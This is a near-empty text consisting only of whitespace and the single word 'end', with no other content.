      

end

